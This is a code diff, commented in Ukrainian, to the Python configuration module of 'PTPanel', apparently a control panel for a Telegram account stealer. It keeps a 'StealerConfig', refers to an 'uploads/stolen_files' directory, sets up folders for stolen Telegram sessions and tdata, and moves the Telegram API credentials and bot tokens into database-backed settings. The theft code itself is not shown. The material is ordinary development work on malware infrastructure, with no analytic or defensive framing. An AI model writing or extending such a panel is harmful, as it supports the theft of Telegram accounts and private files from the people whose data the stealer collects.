@@ -91,40 +91,38 @@ class LoggingConfig:
 
 class PTPanelConfig:
     def __init__(self):
-        # Database - тільки з .env
+        # Системні налаштування (залишаються в .env)
         self.db = DatabaseConfig(
             url=os.getenv('DATABASE_URL'),
             echo=os.getenv('DEBUG', 'False').lower() == 'true'
         )
         
-        # Telegram - тільки з .env
-        self.telegram = TelegramConfig(
-            api_id=int(os.getenv('API_ID')),
-            api_hash=os.getenv('API_HASH'),
-            bot_tokens=self._parse_bot_tokens(),
-            phone=os.getenv('PHONE_NUMBER')
+        # Секретні ключі (залишаються в .env)
+        self.server = ServerConfig(
+            host=os.getenv('HOST', '0.0.0.0'),
+            port=int(os.getenv('PORT', '5000')),
+            debug=os.getenv('DEBUG', 'False').lower() == 'true',
+            secret_key=os.getenv('SECRET_KEY'),
+            app_name="PTPanel"
         )
         
-        # Admin - тільки з .env
+        self.stealer = StealerConfig(
+            encryption_key=os.getenv('ENCRYPTION_KEY')
+        )
+        
+        # Адмін налаштування (з .env)
         self.admin = AdminConfig(
             username=os.getenv('ADMIN_USERNAME'),
             password=os.getenv('ADMIN_PASSWORD'),
             cookie_secure=os.getenv('DEBUG', 'False').lower() != 'true'
         )
         
-        # Server - тільки з .env
-        self.server = ServerConfig(
-            host=os.getenv('HOST'),
-            port=int(os.getenv('PORT')),
-            debug=os.getenv('DEBUG', 'False').lower() == 'true',
-            secret_key=os.getenv('SECRET_KEY'),
-            app_name="PTPanel"
-        )
-        
-        # Stealer - тільки з .env
-        self.stealer = StealerConfig(
-            encryption_key=os.getenv('ENCRYPTION_KEY'),
-            upload_dir='uploads/stolen_files'  # Фіксоване значення
+        # Telegram налаштування (будуть оновлюватись з БД)
+        self.telegram = TelegramConfig(
+            api_id=0,
+            api_hash='',
+            bot_tokens=[],
+            phone=None
         )
         
         # Paths
@@ -143,33 +141,8 @@ class PTPanelConfig:
         # Create necessary directories
         self._create_directories()
         
-        # Setup logging
-        self._setup_logging()
-        
         # Print config info
         self._print_config_info()
-    
-    def _parse_bot_tokens(self) -> List[str]:
-        """Parse bot tokens from separate environment variables"""
-        tokens = []
-        
-        # Список всіх ботів
-        bot_vars = [
-            'BOT_WEBAPP_TOKEN',
-            'BOT_CLASSIC_TOKEN', 
-            'BOT_MULTITOOL_TOKEN',
-            'BOT_ADMIN_TOKEN'
-        ]
-        
-        for bot_var in bot_vars:
-            token = os.getenv(bot_var)
-            if token and ':' in token:
-                tokens.append(token)
-                logger.info(f"Loaded token for {bot_var}")
-            elif token:
-                logger.warning(f"Invalid token format for {bot_var}")
-        
-        return tokens
     
     def _validate_config(self):
         """Validate configuration and log warnings"""
@@ -195,52 +168,52 @@ class PTPanelConfig:
             self.stealer.upload_dir,
             'uploads/sessions',
             'uploads/tdata',
-            self.paths.logs_dir
+            self.paths.logs_dir,
+            'configs/users'
         ]
         
         for directory in directories:
             os.makedirs(directory, exist_ok=True)
             logger.debug(f"Created directory: {directory}")
     
-    def _setup_logging(self):
-        """Setup application logging"""
-        import logging.handlers
-        
-        # Create logger
-        logger = logging.getLogger('ptpanel')
-        logger.setLevel(getattr(logging, self.logging.level))
-        
-        # Remove existing handlers
-        for handler in logger.handlers[:]:
-            logger.removeHandler(handler)
-        
-        # Formatter
-        formatter = logging.Formatter(self.logging.format)
-        
-        # File handler with UTF-8 encoding
-        file_handler = logging.handlers.RotatingFileHandler(
-            self.logging.file,
-            maxBytes=self.logging.max_bytes,
-            backupCount=self.logging.backup_count,
-            encoding='utf-8'
-        )
-        file_handler.setFormatter(formatter)
-        logger.addHandler(file_handler)
-        
-        # Console handler
-        if self.server.debug:
-            console_handler = logging.StreamHandler(sys.stdout)
-            console_handler.setFormatter(formatter)
-            logger.addHandler(console_handler)
-    
     def _print_config_info(self):
         """Print configuration information"""
         print(f">>> PTPanelConfig - Using DATABASE_URL: {self.db.url}")
-        print(f">>> Loaded {len(self.telegram.bot_tokens)} bot tokens")
-        if not self.telegram.bot_tokens:
-            print(">>> WARNING: No bot tokens configured. Bot features will be disabled.")
+        print(f">>> Admin user: {self.admin.username}")
         if self.server.debug:
             print(">>> WARNING: DEBUG mode is enabled. Do not use in production!")
+    
+    def refresh_telegram_config(self, admin_id=1):
+        """Оновлення Telegram конфігурації з БД"""
+        try:
+            from core.config_manager import config_manager
+            
+            # Завантажуємо налаштування з БД
+            telegram_config = config_manager.load_user_config(admin_id, 'telegram')
+            bots_config = config_manager.load_user_config(admin_id, 'bots')
+            
+            # Оновлюємо конфіг
+            if telegram_config.get('api_id'):
+                self.telegram.api_id = int(telegram_config['api_id'])
+            if telegram_config.get('api_hash'):
+                self.telegram.api_hash = telegram_config['api_hash']
+            if telegram_config.get('phone_number'):
+                self.telegram.phone = telegram_config['phone_number']
+            
+            # Збираємо токени ботів
+            tokens = []
+            token_keys = ['webapp_token', 'classic_token', 'multitool_token', 'admin_token']
+            for key in token_keys:
+                token = bots_config.get(key)
+                if token and ':' in token:
+                    tokens.append(token)
+                    logger.info(f"Loaded bot token: {token[:10]}...")
+            
+            self.telegram.bot_tokens = tokens
+            logger.info(f"Refreshed Telegram config: API_ID={self.telegram.api_id}, {len(tokens)} bot tokens")
+            
+        except Exception as e:
+            logger.error(f"Failed to refresh Telegram config: {e}")
 
 # Global config instance
 config = PTPanelConfig()
